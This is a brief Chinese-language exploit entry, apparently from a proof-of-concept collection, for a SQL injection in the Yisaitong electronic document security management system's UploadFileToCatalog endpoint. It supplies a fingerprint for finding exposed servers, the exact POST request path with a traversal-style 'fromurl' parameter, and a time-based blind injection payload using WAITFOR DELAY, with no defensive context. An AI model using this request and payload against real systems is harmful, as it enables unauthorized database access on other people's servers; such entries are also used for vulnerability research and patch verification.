# 亿赛通电子文档安全管理系统UploadFileToCatalogSQL注入漏洞

- **系统**：亿赛通电子文档安全管理系统UploadFileToCatalog　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/CDGServer3/index.jsp"`
- **请求**：`POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
id=1';WAITFOR DELAY '0:0:6'--
```
- **预期**：200　|　—